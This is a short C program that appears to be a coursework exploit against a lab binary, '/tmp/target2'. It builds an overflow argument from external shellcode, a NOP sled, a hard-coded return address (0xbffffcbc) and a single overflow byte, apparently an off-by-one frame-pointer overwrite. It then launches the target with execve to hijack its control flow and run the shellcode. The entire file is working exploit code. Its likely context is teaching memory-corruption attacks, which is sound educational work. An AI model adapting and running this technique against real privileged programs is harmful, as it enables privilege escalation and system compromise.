#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90 
int main(void)
{
  char *args[3];
  char *env[1];
  int addr = 0xbffffcbc;
  int i;
  char buf[202];
    
  strncpy(buf, shellcode, strlen(shellcode));
  for (i = strlen(shellcode); i<196; i++){
    buf[i] = NOP;
  }
  *(int*)(buf+196) = addr; 
  buf[200] = 0x7c;
  buf[201] = 0x00;
  
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  // printf("\narg[1] is %s\n", args[1]);
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
